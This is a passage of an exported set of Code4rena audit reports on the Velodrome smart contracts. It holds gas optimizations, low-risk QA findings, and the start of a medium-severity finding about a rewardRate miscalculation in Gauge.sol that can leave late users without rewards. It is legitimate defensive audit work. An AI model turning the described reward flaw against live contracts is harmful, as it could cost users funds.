{\n\ncontracts/Voter.sol:\n  82:        function setGovernor(address _governor) public {\n  87:        function setEmergencyCouncil(address _council) public {\n 178:        function whitelist(address _token) public {\n\ncontracts/VotingEscrow.sol:\n1184:        function getPastVotes(address account, uint timestamp)\n1185:            public\n1186:            view\n1187:            returns (uint)\n1188:        {\n\n1349:        function delegate(address delegatee) public {\n\n1354:        function delegateBySig(\n1355:            address delegatee,\n1356:            uint nonce,\n1357:            uint expiry,\n1358:            uint8 v,\n1359:            bytes32 r,\n1360:            bytes32 s\n1361:        ) public {\n\ncontracts/redeem/RedemptionReceiver.sol:\n 107:        function addressFromPackedBytes(bytes memory toAddressBytes)\n 108:            public\n 109:            pure\n 110:            returns (address toAddress)\n 111:        {\n\ncontracts/redeem/RedemptionSender.sol:\n  28:        function redeemWEVE(\n  29:            uint256 amount,\n  30:            address zroPaymentAddress,\n  31:            bytes memory zroTransactionParams\n  32:        ) public payable {\n\ncontracts/factories/PairFactory.sol:\n  76:        function getFee(bool _stable) public view returns(uint256) {\n```\n\n## Errors: Reduce the length of error messages (long revert strings)\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional `mstore`, along with additional overhead for computing memory offset, etc.\n\nIn these instances, consider shortening the revert strings to fit within 32 bytes, or using custom errors:  \n```js\ncontracts/VotingEscrow.sol:\n1378:        require(\n1379:            signatory != address(0),\n1380:            \"VotingEscrow::delegateBySig: invalid signature\"\n1381:        );\n\n1382:        require(\n1383:            nonce == nonces[signatory]++,\n1384:            \"VotingEscrow::delegateBySig: invalid nonce\"\n1385:        );\n\n1386:        require(\n1387:            block.timestamp <= expiry,\n1388:            \"VotingEscrow::delegateBySig: signature expired\"\n1389:        );\n```\n\n## Errors: Use custom errors instead of revert strings\nSince Solidity v0.8.4, custom errors should be used instead of revert strings due to:\n* Cheaper deployment cost\n* Lower runtime cost upon revert\n\nTaken from [Custom Errors in Solidity](https://blog.soliditylang.org/2021/04/21/custom-errors/):\n> Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors can be defined using of the `error` statement, both inside or outside of contracts.\n\nInstances where custom errors can be used instead:  \n```js\ncontracts/Gauge.sol:\n 594:        require(rewards.length < MAX_REWARD_TOKENS, \"too many rewards tokens\");\n 615:        require(rewardRate[token] <= balance / DURATION, \"Provided reward too high\");\n 642:        require(rewards.length < MAX_REWARD_TOKENS, \"too many rewards tokens\");\n\ncontracts/Minter.sol:\n  65:        require(msg.sender == team, \"not team\");\n  70:        require(msg.sender == pendingTeam, \"not pending team\");\n  75:        require(msg.sender == team, \"not team\");\n  76:        require(_teamRate <= MAX_TEAM_RATE, \"rate too high\");\n\ncontracts/VeloGovernor.sol:\n  40:        require(msg.sender == team, \"not team\");\n  45:        require(msg.sender == team, \"not team\");\n  46:        require(numerator <= MAX_PROPOSAL_NUMERATOR, \"numerator too high\");\n\ncontracts/Bribe.sol:\n  31:        require(gauge == address(0), \"gauge already set\");\n  44:        require(rewards.length < MAX_REWARD_TOKENS, \"too many rewards tokens\");\n  69:        require(rewards.length < MAX_REWARD_TOKENS, \"too many rewards tokens\");\n\ncontracts/Voter.sol:\n 190:        require(gauges[_pool] == address(0x0), \"exists\");\n 192:        require(IPairFactory(factory).isPair(_pool), \"!_pool\");\n 194:        require(isWhitelisted[tokenA] && isWhitelisted[tokenB], \"!whitelisted\");\n 211:        require(msg.sender == emergencyCouncil, \"not emergency council\");\n 212:        require(isAlive[_gauge], \"gauge already dead\");\n 218:        require(msg.sender == emergencyCouncil, \"not emergency council\");\n 219:        require(!isAlive[_gauge], \"gauge already alive\");\n 318:        require((dayCalc < BRIBE_LAG) || (dayCalc > (DURATION + BRIBE_LAG)), \"cannot claim during votes period\");\n\ncontracts/VotingEscrow.sol:\n 163:        require(idToOwner[_tokenId] != address(0), \"Query for nonexistent token\");\n 307:        require(attachments[_tokenId] == 0 && !voted[_tokenId], \"attached\");\n 518:        require(_isApprovedOrOwner(msg.sender, _tokenId), \"caller is not owner nor approved\");\n 846:        require(attachments[_tokenId] == 0 && !voted[_tokenId], \"attached\");\n 849:        require(block.timestamp >= _locked.end, \"The lock didn't expire\");\n1085:        require(attachments[_from] == 0 && !voted[_from], \"attached\");\n\ncontracts/redeem/RedemptionReceiver.sol:\n  24:        require(_fantomChainId == 12 || _fantomChainId == 10012, \"CHAIN_ID_NOT_FTM\");\n  43:        require(msg.sender == deployer, \"ONLY_DEPLOYER\");\n  44:        require(fantomSender == address(0), \"ALREADY_INITIALIZED\");\n  78:        require(fantomSender != address(0), \"NOT_INITIALIZED\");\n\ncontracts/redeem/RedemptionSender.sol:\n  21:        require(_optimismChainId == 11 || _optimismChainId == 10011, \"CHAIN_ID_NOT_OP\");\n  33:        require(amount != 0, \"AMOUNT_ZERO\");\n\ncontracts/governance/L2Governor.sol:\n  68:        require(_msgSender() == _executor(), \"Governor: onlyGovernance\");\n 260:        require(targets.length == values.length, \"Governor: invalid proposal length\");\n 261:        require(targets.length == calldatas.length, \"Governor: invalid proposal length\");\n 262:        require(targets.length > 0, \"Governor: empty proposal\");\n 265:        require(proposal.voteStart.isUnset(), \"Governor: proposal already exists\");\n 525:        require(state(proposalId) == ProposalState.Active, \"Governor: vote not currently active\");\n\ncontracts/governance/L2GovernorCountingSimple.sol:\n  96:        require(!proposalvote.hasVoted[account], \"GovernorVotingSimple: vote already cast\");\n```\n\n## Unecessary initialization of variables with default values\nUninitialized variables are assigned with a default value depending on its type:\n* `uint`: `0`\n* `bool`: `false`\n* `address`: `address(0)`\n\nThus, explicitly initializing a variable with its default value costs unnecesary gas. For example, the following code:\n```js\nbool b = false;\naddress c = address(0);\nuint256 a = 0;\n```\ncan be changed to:\n```js\nuint256 a;\nbool b;\naddress c;\n```\n\nConsider declaring the following lines without explicitly setting a value:  \n```js\ncontracts/Pair.sol:\n  20:        uint public totalSupply = 0;\n  61:        uint public index0 = 0;\n  62:        uint public index1 = 0;\n 273:        uint nextIndex = 0;\n 274:        uint index = 0;\n\ncontracts/Gauge.sol:\n 222:        uint lower = 0;\n 254:        uint lower = 0;\n 286:        uint lower = 0;\n 481:        uint reward = 0;\n 551:        uint tokenId = 0;\n\ncontracts/RewardsDistributor.sol:\n  73:        uint next_week = 0;\n 103:        uint _min = 0;\n 119:        uint _min = 0;\n 170:        uint user_epoch = 0;\n 171:        uint to_distribute = 0;\n 227:        uint user_epoch = 0;\n 228:        uint to_distribute = 0;\n 299:        uint total = 0;\n\ncontracts/Voter.sol:\n 101:        uint256 _totalWeight = 0;\n 139:        uint256 _totalVoteWeight = 0;\n 140:        uint256 _totalWeight = 0;\n 141:        uint256 _usedWeight = 0;\n\ncontracts/VotingEscrow.sol:\n 622:        uint block_slope = 0; // dblock/dt\n 884:        uint _min = 0;\n 940:        uint _min = 0;\n 960:        uint d_block = 0;\n 961:        uint d_t = 0;\n 996:        uint dt = 0;\n1145:        uint votes = 0;\n1168:        uint32 lower = 0;\n1192:        uint votes = 0;\n\ncontracts/Router.sol:\n 112:        uint _totalSupply = 0;\n\ncontracts/Velo.sol:\n   9:        uint public totalSupply = 0;\n```\n\n## Unnecessary definition of variables\nSome variables are defined even though they are only used once in their respective functions. Not defining these variables can help to reduce gas cost and contract size.\n\nInstances include:  \n```js\ncontracts/Pair.sol:\n 175:        uint _supplyIndex0 = supplyIndex0[recipient];\n 176:        uint _supplyIndex1 = supplyIndex1[recipient];\n 313:        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);\n 413:        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);\n\ncontracts/Gauge.sol:\n 586:        uint _remaining = periodFinish[token] - block.timestamp;\n 607:        uint _remaining = periodFinish[token] - block.timestamp;\n 652:        uint _remaining = periodFinish[token] - block.timestamp;\n\ncontracts/Bribe.sol:\n  48:        uint epochRewards = tokenRewardsPerEpoch[token][adjustedTstamp];\n\ncontracts/Voter.sol:\n 287:        address _pool = poolForGauge[_gauge];\n 290:        uint _supplyIndex = supplyIndex[_gauge];\n\ncontracts/VotingEscrow.sol:\n 246:        bool senderIsOwner = (idToOwner[_tokenId] == msg.sender);\n 247:        bool senderIsApprovedForAll = (ownerToOperators[owner])[msg.sender];\n 285:        bool spenderIsOwner = owner == _spender;\n 286:        bool spenderIsApproved = _spender == idToApprovals[_tokenId];\n 287:        bool spenderIsApprovedForAll = (ownerToOperators[owner])[_spender];\n 554:        uint uepoch = user_point_epoch[_tokenId];\n1047:        uint _epoch = epoch;\n1147:        uint tId = _tokenIds[i];\n1194:        uint tId = _tokenIds[i];\n1265:        uint _timestamp = block.timestamp;\n\ncontracts/Velo.sol:\n  61:        uint allowed_from = allowance[_from][msg.sender];\n```\n\n\n## Storage variables should be declared `immutable` when possible\nIf a storage variable is assigned only in the constructor, it should be declared as `immutable`. This would help to reduce gas costs as calls to `immutable` variables are much cheaper than regular state variables, as seen from the [Solidity Docs](https://docs.soliditylang.org/en/v0.8.13/contracts.html#constant-and-immutable-state-variables):\n> Compared to regular state variables, the gas costs of constant and immutable variables are much lower. Immutable variables are evaluated once at construction time and their value is copied to all the places in the code where they are accessed.\n\nConsider declaring these variables as `immutable`:  \n```js\ncontracts/Pair.sol:\n  13:        string public name;\n  14:        string public symbol;\n\ncontracts/Gauge.sol:\n  20:        bool public isForPair;\n\ncontracts/RewardsDistributor.sol:\n  32:        uint public start_time;\n  40:        address public voting_escrow;\n  41:        address public token;\n```\n\n## Variables declared as `constant` are expressions, not constants\nDue to how `constant` variables are implemented (replacements at compile-time), an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.\n\nIf the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.\n\nSee: [ethereum/solidity#9232](https://github.com/ethereum/solidity/issues/9232):\n> Consequences: each usage of a “constant” costs ~100 gas more on each access (it is still a little better than storing the result in storage, but not much). since these are not real constants, they can’t be referenced from a real constant environment (e.g. from assembly, or from another library)\n\n```js\ncontracts/Pair.sol:\n  30:        uint internal constant MINIMUM_LIQUIDITY = 10**3;\n\ncontracts/Gauge.sol:\n  36:        uint internal constant PRECISION = 10 ** 18;\n\ncontracts/RewardsDistributor.sol:\n  30:        uint constant WEEK = 7 * 86400;\n\ncontracts/Minter.sol:\n  14:        uint internal constant WEEK = 86400 * 7;\n  24:        uint internal constant LOCK = 86400 * 7 * 52 * 4;\n\ncontracts/VotingEscrow.sol:\n 542:        uint internal constant MAXTIME = 4 * 365 * 86400;\n 543:        int128 internal constant iMAXTIME = 4 * 365 * 86400;\n1106:        bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n1109:        bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n\ncontracts/Router.sol:\n  21:        uint internal constant MINIMUM_LIQUIDITY = 10**3;\n```\n\nChange these expressions from `constant` to `immutable` and implement the calculation in the constructor. Alternatively, hardcode these values in the constants and add a comment to say how the value was calculated.\n\n## `approve()` can be optimized in `VotingEscrow.sol`\nIn the `approve()` function, `idToOwner[_tokenId]` is fetched from storage and assigned to `owner` as shown: \n```js\ncontracts/VotingEscrow.sol:\n 240:        address owner = idToOwner[_tokenId];\n```\n\nThus, to prevent fetching values from storage unnecessarily, the code below:\n```js\ncontracts/VotingEscrow.sol:\n 246:        bool senderIsOwner = (idToOwner[_tokenId] == msg.sender);\n```\nshould be changed to:\n```js\ncontracts/VotingEscrow.sol:\n 246:        bool senderIsOwner = (owner == msg.sender);\n```\n\n### Changes in gas cost\n* Deployment size: `3163` to `2991`\n* Average runtime cost: `15237` to `15065`\n\n## Unnecessary declaration of variables in `_deposit_for()` of `VotingEscrow.sol`\nIn `_deposit_for()`, the following variables are unneeded:\n* Line 727: `locked_balance` can be used directly, instead of declaring `_locked`\n* Line 746: `msg.sender` can be used instead of declaring `_from`\n\nAs such, the function can be rewritten to:\n```js\nfunction _deposit_for(\n    uint _tokenId,\n    uint _value,\n    uint unlock_time,\n    LockedBalance memory locked_balance,\n    DepositType deposit_type\n) internal {\n    // LockedBalance memory _locked = locked_balance;\n    uint supply_before = supply;\n\n    supply = supply_before + _value;\n    LockedBalance memory old_locked;\n    (old_locked.amount, old_locked.end) = (locked_balance.amount, locked_balance.end);\n    // Adding to existing lock, or if a lock is expired - creating a new one\n    locked_balance.amount += int128(int256(_value));\n    if (unlock_time != 0) {\n        locked_balance.end = unlock_time;\n    }\n    locked[_tokenId] = locked_balance;\n\n    // Possibilities:\n    // Both old_locked.end could be current or expired (>/< block.timestamp)\n    // value == 0 (extend lock) or value > 0 (add to lock or extend lock)\n    // _locked.end > block.timestamp (always)\n    _checkpoint(_tokenId, old_locked, locked_balance);\n\n    // address from = msg.sender;\n    if (_value != 0 && deposit_type != DepositType.MERGE_TYPE) {\n        assert(IERC20(token).transferFrom(msg.sender, address(this), _value));\n    }\n\n    emit Deposit(msg.sender, _tokenId, _value, locked_balance.end, deposit_type, block.timestamp);\n    emit Supply(supply_before, supply_before + _value);\n}\n```\n### Changes in gas cost\n_Note that this was measured using `deposit_for()`, which internally calls `_deposit_for()`_\n* Deployment size: `150941` to `150921`\n* Average runtime cost: `151226` to `151206`\n\n## Parameter validation checks should be first to save gas upon revert\nParameter validation checks should be completed before any other code. This helps to save runtime gas costs should the function revert.\n\nIn `VotingEscrow.sol`, the functions `deposit_for()`, `_create_lock()` and `increase_amount()` validate the  parameter `_value`:\n```js\nfunction deposit_for(uint _tokenId, uint _value) external nonreentrant {\n    LockedBalance memory _locked = locked[_tokenId];\n\n    require(_value > 0); // dev: need non-zero value\n    // ...\n}\n```\nThis check should be done before any other code in the function to save gas costs, as follows:\n```js\nfunction deposit_for(uint _tokenId, uint _value) external nonreentrant {\n    require(_value > 0); // dev: need non-zero value\n\n    LockedBalance memory _locked = locked[_tokenId];\n    // ...\n}\n```\nThe same applies for `_create_lock()` and `increase_amount()` as well.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/193"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Table of Contents\n\n- [Non-Critical Findings](#non-critical-findings)\n  - [[NC-01] - Lack of require messages](#nc-01---lack-of-require-messages)\n  - [[NC-02] - Misleading storage variable name](#nc-02---misleading-storage-variable-name)\n  - [[NC-03] - Function state mutability can be restricted to `pure`](#nc-03---function-state-mutability-can-be-restricted-to-pure)\n- [Low Risk](#low-risk)\n  - [[L-01] - Events not emitted for important state changes](#l-01---events-not-emitted-for-important-state-changes)\n  - [[L-02] - Zero-address checks are missing](#l-02---zero-address-checks-are-missing)\n  - [[L-03] - Open `@TODOs` left in the code](#l-03---open-todos-left-in-the-code)\n  - [[L-04] - Single-step process for critical ownership/governance transfer is risky](#l-04---single-step-process-for-critical-ownershipgovernance-transfer-is-risky)\n\n## Non-Critical Findings\n\n### [NC-01] - Lack of require messages\n\n#### Description\n\nA message should be specified in the `require` statement so that if the condition fails, the caller can know the reason for failing.\n\n#### Findings\n\nRequire messages are missing in many cases across contracts. You can find all occurrences with the following regex:\n\n`require\\([^,]*\\);$`\n\n#### Recommended mitigation steps\n\nAdd require messages\n\n### [NC-02] - Misleading storage variable name\n\n#### Description\n\nThe storage variable `last_gauge` suggests storing the last gauge. However, it gets the address of the most recently created `Bribe` assigned.\n\n#### Findings\n\n[factories/BribeFactory.sol#L7](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/BribeFactory.sol#L7)\n\n```solidity\naddress public last_gauge; // @audit-info misleading variable name - should be `last_bribe`\n```\n\n#### Recommended mitigation steps\n\nConsider renaming the variable to something like `last_bribe`.\n\n### [NC-03] - Function state mutability can be restricted to `pure`\n\n#### Description\n\nFunctions that do not read and modify any storage variables and only use the arguments provided, can be restricted to `pure`.\n\n#### Findings\n\n[Bribe.getEpochStart](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L35)\n\n#### Recommended mitigation steps\n\nSet function state mutability to `pure`.\n\n## Low Risk\n\n### [L-01] - Events not emitted for important state changes\n\n#### Description\n\nWhen changing state variables events are not emitted. Emitting events allows monitoring activities with off-chain monitoring tools.\n\n#### Findings\n\n**[Bribe.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol)**\n\n[L32](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L32)\\\n[L71](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L71)\\\n[L80](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L80)\n\n**[Gauge.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol)**\n\n[L631](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L631)\\\n[L644](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L644)\n\n**[Minter.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol)**\n\n[L66](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L66)\\\n[L71](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L71)\\\n[L77](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L77)\n\n**[factories/PairFactory.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol)**\n\n[L42](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol#L42)\\\n[L47](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol#L47)\\\n[L52](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol#L52)\\\n[L57](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol#L57)\\\n[L62](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol#L62)\\\n[L65](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/PairFactory.sol#L65)\n\n#### Recommended mitigation steps\n\nEmit events for state variable changes.\n\n### [L-02] - Zero-address checks are missing\n\n#### Description\n\nZero-address checks are a best practice for input validation of critical address parameters. While the codebase applies this to most cases, there are many places where this is missing in constructors and setters.\n\nImpact: Accidental use of zero-addresses may result in exceptions, burn fees/tokens or force redeployment of contracts.\n\n#### Findings\n\n**[Bribe.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol)**\n\n[L32](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Bribe.sol#L32): `gauge = _gauge;`\n\n**[Gauge.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol)**\n\n[97](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L97): `stake = _stake;`\\\n[98](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L98): `bribe = _bribe;`\\\n[99](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L99): `_ve = __ve;`\\\n[100](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L100): `voter = _voter;`\n\n**[Minter.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol)**\n\n[L43](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L43): `_voter = IVoter(__voter);`\\\n[L44](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L44): `_ve = IVotingEscrow(__ve);`\\\n[L45](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L45): `_rewards_distributor = IRewardsDistributor(__rewards_distributor);`\n\n**[VeloGovernor.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VeloGovernor.sol)**\n\n[L41](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VeloGovernor.sol#L41): `team = newTeam;`\n\n**[factories/GaugeFactory.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/GaugeFactory.sol)**\n\n[L14](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/GaugeFactory.sol#L14): `pairFactory = _pairFactory;`\\\n[L19](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/GaugeFactory.sol#L19): `team = _team;`\n\n**[redeem/RedemptionReceiver.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionReceiver.sol)**\n\n[L25](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionReceiver.sol#L25): `USDC = IERC20(_usdc);`\\\n[L26](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionReceiver.sol#L26): `VELO = IVelo(_velo);`\\\n[L28](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionReceiver.sol#L28): `endpoint = _endpoint;`\\\n[L53](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionReceiver.sol#L53): `fantomSender = _fantomSender;`\n\n**[redeem/RedemptionSender.sol](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionSender.sol)**\n\n[L22](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionSender.sol#L22): `weve = _weve;`\\\n[L24](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionSender.sol#L24): `endpoint = _endpoint;`\\\n[L25](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/redeem/RedemptionSender.sol#L25): `optimismReceiver = _optimismReceiver;`\n\n#### Recommended mitigation steps\n\nAdd zero-address checks, e.g.:\n\n```solidity\nrequire(_asset != address(0), \"Zero-address\");\n```\n\n### [L-03] - Open `@TODOs` left in the code\n\n#### Description\n\nThere are several open TODOs left in the code.\n\n#### Findings\n\n[VotingEscrow.sol#L314](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L314)\n\n```solidity\n// TODO delegates\n```\n\n[VotingEscrow.sol#L465](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L465)\n\n```solidity\n// TODO add delegates\n```\n\n[VotingEscrow.sol#L524](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VotingEscrow.sol#L524)\n\n```solidity\n// TODO add delegates\n```\n\n[Minter.sol#L11](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Minter.sol#L11)\n\n```solidity\n// TODO: decide on whether to abstract from VELO or not. currently, it's only somewhat abstracted (e.g. L38) // @audit open todo @LOW\n```\n\n[VelodromeLibrary.sol#L9](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VelodromeLibrary.sol#L9)\n\n```solidity\nIRouter internal immutable router; // TODO make modifiable?\n```\n\n#### Recommended mitigation steps\n\nCheck, fix and remove the todos before it is deployed in production\n\n### [L-04] - Single-step process for critical ownership/governance transfer is risky\n\n#### Description\n\nThe `team` plays a critical role in the `Velodrome` protocol.\n\nGiven that changing `team` uses a single-step process for ownership transfer, it is very risky to perform those changes in a single step because it is irrecoverable from any mistakes.\n\n#### Findings\n\n[factories/GaugeFactory.sol#L17-L20](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/factories/GaugeFactory.sol#L17-L20)\n\n```solidity\nfunction setTeam(address _team) external {\n    require(msg.sender == team);\n    team = _team;\n}\n```\n\n[VeloGovernor.sol#L39-L42](https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/VeloGovernor.sol#L39-L42)\n\n```solidity\nfunction setTeam(address newTeam) external {\n    require(msg.sender == team, \"not team\");\n    team = newTeam;\n}\n```\n\n#### Recommended mitigation steps\n\nConsider implementing a two-step process where the current `team` nominates an account and the nominated account needs to call an `acceptTeam()` function (similar as it's already done in the `Minter` contract) for the transfer of `team` ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-velodrome-findings",
      "repo": "https://github.com/code-423n4/2022-05-velodrome-findings",
      "url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/187"
    }
  },
  {
    "title": "Wrong calculation for the new `rewardRate[token]` can cause some of the late users can not get their rewards",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L597-L612\n\n\n# Vulnerability details\n\n```solidity\nuint bribeStart = block.timestamp - (block.timestamp % (7 days)) + BRIBE_LAG;\nuint adjustedTstamp = block.timestamp < bribeStart ? bribeStart : bribeStart + 7 days;\nif (rewardRate[token] == 0) _writeRewardPerTokenCheckpoint(token, 0, adjustedTstamp);\n(rewardPerTokenStored[token], lastUpdateTime[token]) = _updateRewardPerToken(token);\n_claimFees();\n\nif (block.timestamp >= periodFinish[token]) {\n    _safeTransferFrom(token, msg.sender, address(this), amount);\n    rewardRate[token] = amount / DURATION;\n} else {\n    uint _remaining = periodFinish[token] - block.timestamp;\n    uint _left = _remaining * rewardRate[token];\n    require(amount > _left);\n    _safeTransferFrom(token, msg.sender, address(this), amount);\n    rewardRate[token] = (amount + _left) / DURATION;\n}\n```\n\nIn `Gauge.sol#notifyRewardAmount()`, the updated rewardRate for the token: `rewardRate[token]` is calculated based on the newly added amount of tokens (`amount`), the remaining amount of existing rewards (`_left`), and the `DURATION`.\n\nWhile the DURATION is `5 days`, the period from the current time to `periodFinish[token]` is much longer.\n\n`rewardPerToken()` is calculated based on the current time, `lastUpdateTime[token]`, and `rewardRate[token]`.\n\nhttps://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L375-L380\n\n```solidity\nfunction rewardPerToken(address token) public view returns (uint) {\n    if (derivedSupply == 0) {\n        return rewardPerTokenStored[token];\n    }\n    return rewardPerTokenStored[token] + ((lastTimeRewardApplicable(token) - Math.min(lastUpdateTime[token], periodFinish[token])) * rewardRate[token] * PRECISION / derivedSupply);\n}\n```\n\n`lastUpdateTime[token]` will frequently be updated to the current timestamp by `_updateRewardForAllTokens()`.\n\nSee: https://github.com/code-423n4/2022-05-velodrome/blob/7fda97c570b758bbfa7dd6724a336c43d4041740/contracts/contracts/Gauge.sol#L460-L469\n\nAs a result, `rewardPerToken()` can be much higher than expected, which makes the total amount of reward tokens less than the total amount of 